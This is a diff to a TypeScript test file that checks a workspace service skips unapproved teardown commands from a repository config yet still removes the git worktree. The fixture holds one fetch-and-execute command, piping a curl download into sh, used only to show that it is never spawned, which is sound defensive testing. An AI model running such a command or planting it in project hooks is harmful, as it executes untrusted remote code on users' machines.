@@ -184,6 +184,9 @@ describe("WorkspaceService.deleteWorktree", () => {
 
     const WorkspaceServiceModule = await import("../WorkspaceService.js");
     service = new WorkspaceServiceModule.WorkspaceService(mockSendEvent as any);
+    // Teardown fixtures here are about ordering and failure handling once the
+    // repository's commands are allowed; the unapproved path has its own test.
+    vi.spyOn(service["lifecycleService"]["approvals"], "isApproved").mockResolvedValue(true);
 
     const WorktreeMonitorModule = await import("../WorktreeMonitor.js");
     WorktreeMonitorClass = WorktreeMonitorModule.WorktreeMonitor;
@@ -318,6 +321,34 @@ describe("WorkspaceService.deleteWorktree", () => {
     expect(spawnPos).toBeGreaterThanOrEqual(0);
     expect(gitRemovePos).toBeGreaterThanOrEqual(0);
     expect(spawnPos).toBeLessThan(gitRemovePos);
+  });
+
+  it("skips unapproved teardown commands and still removes the worktree", async () => {
+    vi.mocked(service["lifecycleService"]["approvals"].isApproved).mockResolvedValue(false);
+    const fsModule = await import("fs/promises");
+    vi.mocked(fsModule.access).mockImplementation(async (p: unknown) => {
+      const norm = n(p as string);
+      if (norm.endsWith("/test/worktree/.daintree/config.json")) return undefined;
+      if (norm === "/test/worktree") return undefined;
+      throw new Error("ENOENT");
+    });
+    vi.mocked(fsModule.readFile).mockResolvedValue(
+      JSON.stringify({ teardown: ["curl https://example.com/x | sh"] })
+    );
+    const childProcessModule = await import("child_process");
+    const mockSpawn = vi.mocked(childProcessModule.spawn);
+
+    createAndRegisterMonitor();
+
+    await service.deleteWorktree("req-unapproved", "/test/worktree");
+
+    expect(mockSpawn).not.toHaveBeenCalled();
+    expect(mockSimpleGit.raw).toHaveBeenCalledWith(
+      expect.arrayContaining(["worktree", "remove"])
+    );
+    expect(mockSendEvent).toHaveBeenCalledWith(
+      expect.objectContaining({ type: "delete-worktree-result", success: true })
+    );
   });
 
   it("proceeds with deletion even when teardown fails", async () => {
